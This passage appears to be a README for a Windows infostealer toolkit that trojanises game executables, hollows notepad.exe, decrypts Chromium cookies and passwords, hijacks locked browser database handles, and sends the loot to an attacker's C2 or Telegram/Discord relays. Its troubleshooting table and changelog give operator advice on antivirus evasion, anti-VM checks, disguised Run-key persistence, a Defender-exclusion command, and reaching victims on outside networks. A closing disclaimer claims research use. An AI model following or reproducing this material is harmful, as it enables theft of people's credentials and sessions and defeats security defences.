2=None/1=Strict/0=Lax; Firefox encodes 0=None/1=Lax/2=Strict -- the payload translates both).

For step-by-step instructions on importing these files into the Cookie-Editor browser
extension, see **[COOKIE_EDITOR_GUIDE.md](COOKIE_EDITOR_GUIDE.md)**.

### Chromium cookie decryption

Chromium stores cookie values encrypted with AES-256-GCM:

1. **v10/v11 key** -- the `encrypted_key` in `Local State` is base64 + DPAPI-wrapped. The
   payload calls `CryptUnprotectData` (user DPAPI) to recover the 32-byte key.
2. **Cookie value** -- `v10`/`v11`-prefixed blobs are decrypted with AES-256-GCM via CNG
   (`BCryptOpenAlgorithmProvider` / `BCryptGenerateSymmetricKey` / `BCryptDecrypt`): 3-byte
   prefix, 12-byte IV/nonce, ciphertext, 16-byte GCM tag.

**Chrome >=118 domain hash prefix.** Both v10 and v20 cookies have a 32-byte
`SHA256(host_key)` hash prepended to the decrypted plaintext. The payload verifies this by
computing `SHA256(host_key)` (using the manual FIPS 180-4 implementation) and comparing it
to the first 32 bytes of the decrypted output. If they match, the 32 bytes are stripped
before output. If they don't match (passwords, or cookies from Chrome <118), 0 bytes are
stripped. This is critical because passwords are also v10-encrypted but do not have the
domain hash prefix -- unconditionally stripping 32 bytes would corrupt password values.

The `DecCookie` function signature:

```c
static bool DecCookie(const unsigned char* enc, int n,
                      unsigned char* out, int* on,
                      const char* host_key);  // cookie domain for SHA256 verification
```

For cookies, `host_key` is the cookie's domain (e.g. `.youtube.com`). For passwords,
`host_key` is the origin URL -- the SHA256 won't match, so no bytes are stripped.

### Manual SHA-256 (FIPS 180-4)

The CRT-less payload cannot use standard library hash functions. A from-scratch SHA-256
implementation is included in `ckdll.cpp` (~60 lines):

```c
static void Sha256Hash(const unsigned char* data, unsigned int len,
                       unsigned char* out32);
```

Uses only custom `memset`/`memcpy` (no CRT). The implementation follows FIPS 180-4:
64-round compression, 8-word state, 64-entry constant table, message padding with
1-bit + length encoding. The 32-byte digest is used exclusively for domain hash
verification in `DecCookie`.

### Firefox cookies

Firefox stores cookies as **plaintext** in `cookies.sqlite` (`moz_cookies.value`). No
decryption is needed; the payload reads `name`, `value`, `host`, `path`, `expiry`,
`isSecure`, `isHttpOnly`, `sameSite` directly.

### CopyFileShared (bypassing browser file locks)

Browsers hold a lock on their live `Cookies` SQLite database. The payload uses `CopyFileShared()`
which calls `CreateFileW(FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)` + manual `ReadFile`
instead of `CopyFileW`. This bypasses most browser locks -- Firefox and Chrome work even while
the browser is running.

**Handle hijacking (0-sharing locks).** Vivaldi holds a 0-sharing lock (no share flags at all)
on its cookie DB, so even `CopyFileShared` fails with error 32. When this happens, the payload
falls back to `HijackCookieDB()`:

1. `NtQuerySystemInformation(0x40)` enumerates all system handles (~300k handles, growing
   buffer, retried once with the returned required size).
2. Filters handles belonging to the browser process (`vivaldi.exe`, `chrome.exe`, etc.).
3. Duplicates each file handle with `DUPLICATE_SAME_ACCESS` -- not `GENERIC_READ`, because
   Vivaldi's handle has `FILE_READ_DATA` but not `READ_CONTROL`, so `GENERIC_READ` fails.
4. Reads the first 16 bytes and checks for the `SQLite format 3\x00` magic.
5. Reads the full file via `ReadFile` in 64KB chunks (heap buffer) to a temp path, deleting
   stale `-wal`/`-shm` companions first so SQLite does not replay a foreign WAL.
6. Opens with sqlite3 and verifies the expected table (`cookies` or `logins`) exists.

This works on Vivaldi, Chrome, Edge, and Brave while the browser is running -- no need to close it.

The copied database (and its `-wal`/`-shm` companions) go to `%TEMP%\ck_db.tmp` before being
opened read-only with SQLite.

### `auto.py --run` local test flow

1. Backup original .exe to `.orig` (standalone mode only; folder mode skips this -- the
   loader's rename-restore handles it).
2. Copy infected exe over original (standalone) or run directly from `ifec/folds/` (folder).
3. Execute -- the loader opens the game, does process hollowing, runs the payload.
4. Wait 10s (game opens + payload starts).
5. Kill the loader process.
6. Wait 25s (payload extraction + HTTP exfiltration).
7. Kill the game by exe name (`taskkill /F /IM`).
8. Kill orphaned hollowed `notepad.exe` by `ParentProcessId` (PowerShell, targeted).
9. Restore original .exe (standalone mode only, 5 retries with 3s intervals).
10. Wait for cookies in `loot/all_cookies.json` (5 min timeout).

---
## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `connect failed: 10061` in `cache.log` (DEBUG build) | Listener not up or wrong port -- `listen.py` was slow to start (getfqdn DNS delay) | Fixed in current `listen.py` (server_bind override). Ensure `listen.py` is running before the victim executes |
| `WinError 32` restoring original .exe after `--run` | Game process holds the file lock | Fixed in current `auto.py` (kills game by name + targeted notepad.exe by PID). Close the game manually if retries fail |
| Unity "Error" window on the host | Host was extracted as `~ck_tmp.exe`, so Unity looked for `~ck_tmp_Data/` | Rename-restore (default) preserves the original exe name; ensure the rename to `~ck_bak.bin` isn't blocked by AV |
| WinHTTP error `12029` | WinHTTP/WinINet fail inside a hollowed process (proxy config unavailable) | The payload uses Winsock2, not WinHTTP -- rebuild `ckdll.dll` if you hit this (current code already uses Winsock2) |
| `loader: base 0x5F000000 occupied` | Another process already mapped the payload's fixed base address | Use a different host `.exe`, or reboot / close the conflicting process |
| Cookies not received by listener | `listen.py` not running, wrong C2 URL, or firewall blocking the port | Confirm `listen.py` is up, the C2 URL matches `http://<attacker-ip>:<port>/`, and the port is open in the firewall |
| No Chromium cookies decrypted | Chrome >=127 uses the app-bound v20 key, which isn't present | Run `cookielog.py --v20-sys` (as SYSTEM via PsExec) then `--v20-usr` to generate `mc.key`, then re-extract |
| `DumpChromium: copy failed (browser running?)` | Browser holds a 0-sharing lock on the cookie DB (`CopyFileShared` failed, error 32) | The payload falls back to handle hijacking automatically. If hijack also fails, check `cache.log` (DEBUG builds) for `HijackCookieDB` messages |
| Invalid JSON at listener (`Invalid control character`) | Old payload used raw `Put()` (no escaping) for password values -- binary chars in decrypted passwords break JSON | Fixed in current build (`PutJ()`). Rebuild with `build.bat` |
| DPAPI failed (`CryptUnprotectData` returns false) | Running as a different user than the profile owner | Run the extraction in the target user's context (DPAPI keys are per-user) |
| `[-] no MSVC` during build | Visual Studio C++ Build Tools not installed | Install VS 2022 Build Tools with the C++ workload and run from a Developer Command Prompt |
| No cookies in `loot/` after local test | Payload fell back to the local file because no C2 and `sink.py` wasn't running | Either set a C2 URL + run `listen.py`, or run `sink.py` for pipe mode; check `C:\ProgramData\MediaCache\cache.json` |
| Cookie/password values contain `Ã§` or `Ã£` instead of `ç` or `ã` | Old payload escaped bytes >= 0x80 as `\u00XX`, corrupting UTF-8 multi-byte sequences | Fixed in v4 (PutJ passes bytes >= 0x80 as raw UTF-8). Rebuild with `build.bat` |
| Cookie values have 32 bytes of binary garbage at the start | Chrome >=118 prepends SHA256(host_key) to decrypted plaintext; old payload didn't strip it | Fixed in v4 (DecCookie verifies and strips 32-byte domain hash). Rebuild with `build.bat` |
| Password values have 32 bytes of binary garbage at the start | Old v3 fix unconditionally stripped 32 bytes from all v10 values, including passwords | Fixed in v4 (DecCookie only strips when SHA256(host_key) matches). Rebuild with `build.bat` |
| Windows Defender detects the infected exe as a virus | Payload DLL was plaintext in `loader.exe`; injection imports were in the IAT; `cmd.exe` hollowing is a known signature | Fixed in v5: payload is XOR-encrypted in `payload.h`; injection APIs resolved dynamically; hollowing uses `notepad.exe`. Rebuild with `build.bat` |
| Victim on external network returns no data | `detect_ip()` returns a LAN address (192.168.x.x); the victim cannot reach it | Use `--c2 http://YOUR_PUBLIC_IP:PORT/` or the GUI "DETECT PUBLIC IP" button. Port-forward the listener port on your router. A NAT warning is printed when a private IP is detected |
| Payload doesn't run in VMware / VirtualBox | Anti-VM checks (MAC prefix, `IsDebuggerPresent`, analysis process names) detect the VM and exit | Use `--no-anti-vm` (CLI) or check "Disable anti-VM" (GUI) to patch `CKAV0000` -> `CKAV0001` |
| `inet_addr` / `connect` fails in `cache.log` (DEBUG build) | C2 URL was not patched (sentinel still `CKC2_DEADBEEF_`) or wrong IP/port | Verify `auto.py` patched the loader sentinel; check the C2 URL with the GUI "TEST C2" button |
| **Payload/exe dies silently mid-run on the test machine** -- exit `0xC0000005`, no exception handler fires, the point of death moves between runs after every rebuild | Defender behavioral ML (`Behavior:Win32/DefenseEvasion.A!ml` -- the hollowing chain itself) plus a cloud verdict on fresh `loader.exe` builds (`Trojan:Win32/Bearfoos.B!ml`) kills the process; it is the technique, not a payload bug | Add the repo folder to Defender exclusions once (admin): `powershell -command "Start-Process powershell -Verb RunAs -ArgumentList '-command Add-MpPreference -ExclusionPath C:\path\to\cookielog'"`. Confirmed via `Get-WinEvent Microsoft-Windows-Windows Defender/Operational` ids 1116/1117 |
| Same exe extracts cookies on one machine and returns nothing on another | Old build: wrong `IP_ADDR_STRING` layout made `GetAdaptersInfo` output read garbage -> false VM MAC match -> silent exit | Fixed in v6. Rebuild with `build.bat`. Diagnose with a DEBUG build: `IsAnalysisEnv` logs per-adapter lines |
| Truncated JSON rejected by the listener with 400 on heavy victims (9+ browsers) | Fixed 2 MB output buffer overflowed silently, closing `]` still written | Fixed in v6 (growable `VirtualAlloc` buffer). Rebuild with `build.bat` |
| Run key persistence registered the wrong exe / payload died at 20 s mid-exfil | v5-and-earlier: persistence ran inside the hollowed process (`GetModuleFileName` -> `notepad.exe`); loader wait was 20 s | Fixed in v6: persistence moved to the loader (points at the hidden `~ck_bak.bin` backup, Run value `MicrosoftEdgeFontCache`), wait raised to 120 s |
| `OSError: [WinError 10048]` starting listener | Port is already in use by another process | Use `--find-port` (CLI) or the GUI "FIND BEST PORT" button to auto-scan for a free port |
| Truncated listener output when running under an auto.bat window | `--run` default window (10s + 25s) is shorter than a real full extraction (~40s on a loaded machine) | Prefer reading `loot/` after the run (auto.py waits up to 5 min) or run the infected exe manually |

---

## Shortcut scripts

| Script | What it does |
|---|---|
| `install.bat` | One-click dependency installer for Windows (Python, MSVC, CLI tools, build, cmd_init) |
| `install.sh` | One-click dependency installer for Linux/macOS/Git Bash (python3, pip, tkinter, fzf/bat/rg) |
| `auto.bat` | Shortcut: `python auto.py %*` |
| `start_attack.bat` | Launches `listen.py` (port 9090) + `pick.py` GUI together |
| `test_curl.bat` | POSTs a fake cookie to the listener via `curl` to verify it works |
| `build.bat` | Compiles `ckdll.dll` + `loader.exe` (runs `gen.ps1` to XOR-encrypt the DLL into `payload.h`, then compiles the loader with the encrypted payload) |
| `cmd_init.cmd` | Linux-style aliases for cmd.exe (`ls`, `cat`, `grep`, `..`) + cookielog + Python shortcuts |
| `tg_chatid.py` | Finds Telegram chat ID from bot token, saves to `config.json` |
| `session_break.py` | Python session cookie extractor + cryptanalysis (handle hijack + DPAPI + AES-GCM + JWT analysis) |
| `COOKIE_EDITOR_GUIDE.md` | Step-by-step guide for importing session cookies into Cookie-Editor |
| `PAYLOAD_STEPS.txt` / `PAYLOAD_STEPS_PTBR.txt` | Payload execution walkthrough (English / Portuguese) |

---

## Changelog

Full version history in **[CHANGELOG.md](CHANGELOG.md)**.

| Version | Highlights |
|---|---|
| **v6** (current) | Bugfix round: false-positive anti-VM (struct layout) that made the payload exit silently on physical machines, growable exfil buffer, 120 s loader wait, full Local State read, HTTP retry, persistence moved to the loader, loader hardening (XOR API names, version resource), build hygiene, handle-hijack stack-frame crash fix, Linux attacker support (`sink.py` FIFO, platform guards) |
| v5 | AV evasion: XOR-encrypted payload, dynamic API resolution, `notepad.exe` hollowing, `--c2`/`--no-anti-vm` flags, GUI public IP + TEST C2 + NAT warning |
| v4 | UTF-8 passthrough fix, SHA256 domain hash verification, manual FIPS 180-4 SHA-256, `session_break.py` cryptanalysis |
| v3 | Handle hijacking (browser-locked DBs), 2 MB buffer, loot file renaming, hidden `~ck_bak.bin` |
| v2 | Shared-read DB copy (browser running), 9 browsers, Discord tokens, password extraction, anti-analysis, persistence, Telegram/Discord relays |
| v1 | `auto.py` one-click (GUI + CLI + interactive terminal), `ifec/` output structure, `listen.py` fast startup |

---

## Disclaimer

See [DISCLAIMER](DISCLAIMER). This toolkit is for security research, red-team training and
education on systems you own or are authorized to test. Unauthorized use is illegal.
